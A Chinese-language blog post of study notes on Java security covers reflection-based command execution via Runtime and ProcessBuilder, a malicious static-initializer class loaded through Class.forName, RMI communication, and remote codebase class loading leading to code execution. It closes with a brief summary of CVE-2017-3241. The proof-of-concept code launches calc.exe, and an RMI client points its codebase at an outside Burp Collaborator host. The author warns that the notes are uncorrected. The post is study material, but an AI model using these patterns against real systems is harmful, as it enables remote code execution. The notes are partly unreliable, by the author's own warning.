---
title: "Java学习笔记Ⅳ"
slug: "java-study-notes-04"
description: "反射&RMI安全相关 | *有大量修正未同步，请勿参考本文学习"
date: 2022-05-04T16:03:58+08:00
categories: ["NOTES&SUMMARY"]
series: ["Java学习笔记"]
tags: ["Java"]
draft: false
toc: true
---

p牛安全漫谈学习

## 反射

关于动态特性，p牛给出了这样的定义

> 一段代码，改变其中的变量，将会导致这段代码产生功能性的变化

PHP的一句话🐎也正是这个特性的体现之一，java虽然没有PHP这么灵活，但是强大的反射功能也可以提供一些动态特性，比如这样的函数

```java
public void execute(String className, String methodName) throws Exception{
	Class cls = Class.forName(className);
	cls.getMethod(methodName).invoke(cls.newInstance());	// 执行
}
```

最终执行的方法根据传入的参数而定

### forName

获取一个`class`的`Class`实例的方式之一是`Class.forName`，它有两个函数重载

```java
Class<?> forName(String name)	// 常用
Class<?> forName(String name, **boolean** initialize, ClassLoader loader)
```

第一个参数是类名，完整路径（如果可控就可以加载任意类），如果加载内部类可以用`Class.forName("C1$C2")`

第三个参数`ClassLoader`的作用是告诉JVM如何加载这个类，java默认的`ClassLoader`就是根据类名（类完整路径）来加载类

对于第二个参数，即使我们设置`true`，也不会在执行`forName`时执行构造函数，因为这里的`initialize`指的是类的初始化，调用其中的`static`部分代码

- 类的实例化(newInstance)：static{} -> {} -> 构造函数

- 类的初始化(initial)：static{}

由此，如果`forName`的参数可控，我们可以编写恶意类（恶意代码位于static中），进而完成对指定类的初始化 触发static{}部分；编写poc

```java
package ref;

public class victim {
    public static void main(String[] args) throws Exception{
        String name = "ref.exp";
        Class.forName(name);
    }
}
```

```java
package ref;

public class exp {
    static {
        try{
            Runtime rt = Runtime.getRuntime();
            String[] cmd = {"calc.exe"};
            Process ps = rt.exec(cmd);
            ps.waitFor();
        }catch (Exception e){
            System.out.println("error here");
        }
    }
}
```

### getMethod&invoke

`Class.newInstance`调用的是该类的public无参构造函数，而有参数的构造方法 或非`public`的构造方法都无法通过`Class.newInstance()`调用，比如`Runtime`的构造方法就是私有的（单例模式），下面的栗子就无法执行

```java
Class cls = Class.forName("java.lang.Runtime");
cls.getMethod("exec", String.class).invoke(cls.newInstance(), "calc.exe");
```

鉴于此，我们可以通过`Runtime.getRuntime`获取到`Runtime`对象，这里指定的重载为最简单的`exec`，依旧是通过invoke调用：

```java
Class cls = Class.forName("java.lang.Runtime");
cls.getMethod("exec", String.class).invoke(cls.getMethod("getRuntime").invoke(cls), "calc.exe");
```

`invoke`作用是执行方法，如果这个方法是普通方法，那么第一个参数是类对象；如果是静态方法，那么第一个参数是类，上面的payload相当于

```java
Class cls = Class.forName("java.lang.Runtime");
Method execMethod = cls.getMethod("exec", String.class);
Method getRuntimeMethod = cls.getMethod("getRuntime");
Object runtime = getRuntimeMethod.invoke(cls);
execMethod.invoke(runtime, "calc.exe");
```

另一个API是`getDeclaredMethod`，获取当前类声明的所有方法（不包括从父类继承来的方法 包含当前类的私有方法），结合这一点，我们也可以通过这个api获取到`Runtime`对象并调用

```java
Class cls = Class.forName("java.lang.Runtime");
Constructor m = cls.getDeclaredConstructor();
m.setAccessible(true);
cls.getMethod("exec", String.class).invoke(m.newInstance(), "calc.exe");
```

注意必须同时设置`setAccessible(true)`修改作用域

### getConstructor

当一个类没有public的无参构造方法时，我们可以首先用`getConstructor`获取到构造函数（需要传入参数类型 因为可以有多种构造函数），之后用`newInstance`实例化对象，再经过强制类型转换后用`start`执行；这里用ProcessBuilder作示例

```java
Class cls = Class.forName("java.lang.ProcessBuilder");
((ProcessBuilder) cls.getConstructor(List.class).newInstance(Arrays.asList("calc.exe"))).start();
```

如果目标环境没有强制类型转换时，我们可以再次借助反射

```java
Class cls = Class.forName("java.lang.ProcessBuilder"); cls.getMethod("start").invoke(cls.getConstructor(List.class).newInstance(Arrays.asList("calc.exe")));
```

先获取到`start`方法，然后`invoke`执行，invoke 的第一个参数就是ProcessBuilder Object，逻辑也是很顺的：先获取要执行的方法，然后传入执行的参数

如果要使用ProcessBuilder的另一个重载（参数为可变长参数String... command 相当于数组），可以这样

```java
Class cls = Class.forName("java.lang.ProcessBuilder");
((ProcessBuilder) cls.getConstructor(String[].class).newInstance(new String[][]{{"calc.exe"}})).start();
```

## RMI

即Remote Method Invocation，不让它RCE都对不起这个R

### 通信实现

Server编写实现类并注册为服务createRegistry，Client查找服务并获得接口实例getRegistry，两者共享相同的接口interface

当Client连接时，首先连接Registry并寻找想要的对象，发送Call消息；之后Server返回对象（序列化数据），ReturnData消息；Client收到后反序列化得到远程对象，与其建立TCP连接，在这个新的连接中才会在Server端执行方法调用

可以直接通过rmi://xxx:xxx/这样的地址获取所有绑定的对象（直通RMI Registry后台

```java
String[] s = Naming.list("rmi://ip:port");
```

对于rebind, bind, unbind这样的危险方法只有当来源是locahost才行，远程用不了

对于反序列化数据，可以用[SerializationDumper](https://github.com/NickstaDB/SerializationDumper/releases/)进行分析，用wireshark 复制-> as a hex Stream

```bash
java -jar SerializationDumper-v1.1.jar "deadbeaf"
```

https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html

一个简单的rmiserver&rmiclient的栗子

```java
package server;

import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.server.UnicastRemoteObject;

public class RMIServer {
    public interface IRemoteHelloWorld extends Remote{
        public String hello() throws RemoteException;
    }

    public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld{
        protected RemoteHelloWorld() throws RemoteException{
            super();
        }

        @Override
        public String hello() throws RemoteException {
            System.out.println("call from");
            return "Hello world";
        }
    }

    public void start() throws Exception{
        RemoteHelloWorld h = new RemoteHelloWorld();
        LocateRegistry.createRegistry(9092);
        Naming.rebind("rmi://127.0.0.1:9092/Hello", h);
    }

    public static void main(String[] args) throws Exception{
        new RMIServer().start();
    }
}
```

```java
package client;

import server.RMIServer;

import java.rmi.Naming;

public class TrainMain {
    public static void main(String[] args) throws Exception{
        RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld) Naming.lookup("rmi://192.168.31.175:9092/Hello");
        String ret = hello.hello();
        System.out.println(ret);
    }
}
```

### codebase to RCE

codebase是类似classpath的一个地址，告知JVM去哪里搜索类，常用于http, ftp这样远程的情况

在RMI通信过程中，反序列化对象时寻找类时先在自己的classpath下寻找，如果本地找不到就回去远程加载codebase中的类，假如我们指定`codebase=http://example.com/` 然后加载`org.test.vuln`类，jvm就会下载`http://example.com/org/test/vuln.class` 并将其作为vuln类的字节码进行加载

所以如果codebase可控，再满足以下条件，就可以加载恶意类了：

- 安装并配置了SecurityManager
- Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false

java.rmi.server.useCodebaseOnly是在Java 7u21、6u45的时候修改的一个默认设置，值由false改为了true；在为true的情况下JVM只信任预先配置好的codebase，不支持从RMI中获取，以下是测试代码：

Server部分

```java
// Icalc.java
package server;

import java.rmi.Remote;
import java.rmi.RemoteException;
import java.util.List;

public interface ICalc extends Remote {
    public Integer sum(List<Integer> params)throws RemoteException;
}

// Calc.java
package server;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.List;

public class Calc extends UnicastRemoteObject implements ICalc {
    public Calc() throws RemoteException{};
    public Integer sum(List<Integer> params) throws RemoteException{
        Integer sum = 0;
        for(Integer param: params){
            sum += param;
        }
        return sum;
    }
}

// CalcServer.java
package server;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class CalcServer {
    private void start() throws Exception{
        if(System.getSecurityManager() == null){
            System.out.println("Setup SecurityManager");
            System.setSecurityManager(new SecurityManager());
        }
        Calc h = new Calc();
        LocateRegistry.createRegistry(9093);
        Naming.rebind("rmi://192.168.31.175:9093/refobj", h);
    }

    public static void main(String[] args) throws Exception{
        System.setProperty("java.security.policy","E:\\JavaStudy\\test01\\client.policy");
        System.setProperty("java.rmi.server.hostname","192.168.31.175");
        System.setProperty("java.rmi.server.useCodebaseOnly","false");
        new CalcServer().start();
    }
}


// client.policy
grant {
permission java.security.AllPermission;
};
```

Client部分（确保与Server的classpath不同）

```java
// HelloClient.java
package rmiT;

import java.io.Serializable;
import java.rmi.Naming;
import java.util.ArrayList;
import java.util.List;

public class HelloClient implements Serializable {
    public class Payload extends ArrayList<Integer>{}
    public void lookup() throws Exception{
        ICalc r = (ICalc) Naming.lookup("rmi://192.168.31.175:9093/refobj");
        List<Integer> li = new Payload();
        li.add(3);
        li.add(4);
        System.out.println(r.sum(li));
    }

    public static void main(String[] args) throws Exception{
        System.setProperty("java.rmi.server.useCodebaseOnly","false");
        System.setProperty("java.security.policy","E:\\JavaStudy\\test01\\client.policy");
        System.setProperty("java.rmi.server.codebase","http://nxo90f9obuj1boi0bzbdanmca3gt4i.burpcollaborator.net/");
        if(System.getSecurityManager() == null){
            System.out.println("Setup SecurityManager");
            System.setSecurityManager(new SecurityManager());
        }
        new HelloClient().lookup();
    }
}


// Icalc.java
package rmiT;

import java.rmi.Remote;
import java.rmi.RemoteException;
import java.util.List;

public interface ICalc extends Remote {
    public Integer sum(List<Integer> params)throws RemoteException;
}
```

运行CalcServer和HelloClient，会看到client的报错

```
Exception in thread "main" java.lang.ClassFormatError: Incompatible magic value 1013478509 in class file server/ICalc
```

同时注意到我们的burp收到了请求

![image-20220504013700746](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220504013700746.png)

利用的话将class放在Web服务器的 /RMIClient$Payload.class即可

codebase通过`[Ljava.rmi.server.ObjID;`的`classAnnotations`（由`annotateClass`方法写入）传递，所以即使我们没有RMI客户端，只要修改`classAnnotations`的值就可以控制codebase，指向我们的网站

## CVE-2017-3241

[Java RMI远程反序列化任意类及远程代码执行解析（CVE-2017-3241 ）](https://www.daimajiaoliu.com/daima/4761a96151003fc)  |  [CVE-2017-3241-POC](https://github.com/xfei3/CVE-2017-3241-POC)  |  [CVE-2017-3241 Java RMI Registry.bind()反序列化漏洞](http://www.code2sec.com/cve-2017-3241-java-rmi-registrybindfan-xu-lie-hua-lou-dong.html)  |  [JAVA RMI 反序列化远程命令执行漏洞](https://blog.csdn.net/LeeHDsniper/article/details/71599504)  |  [一次攻击内网rmi服务的深思](http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/)  |  [【技术分享】Java AMF3 反序列化漏洞分析](https://www.anquanke.com/post/id/85846)

> <=8u112 直接利用
>
> 8u112< JDK < 8u241 需要反链恶意JRMP服务端，所以需要目标服务器能访问攻击者控制的服务器

TL;DR：对于RMI服务，server端除了正常实现rmi接口的A类之外还存在一个实现了readObject方法的PublicKnown类（比如常见的cc），我们的恶意客户端可以在本地用完整的类名重写A类（调用PublicKnown的反序列化相关方法进行rce）并作为RMI的参数传入，触发rce；poc代码请参见[这里](https://github.com/xfei3/CVE-2017-3241-POC)

![image.png](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/1599551987770-38f4ea97-a031-4790-b11d-e73e60eab647.png)

具体的各版本绕过参考上面的🔗，我就不班门弄斧了喵（）

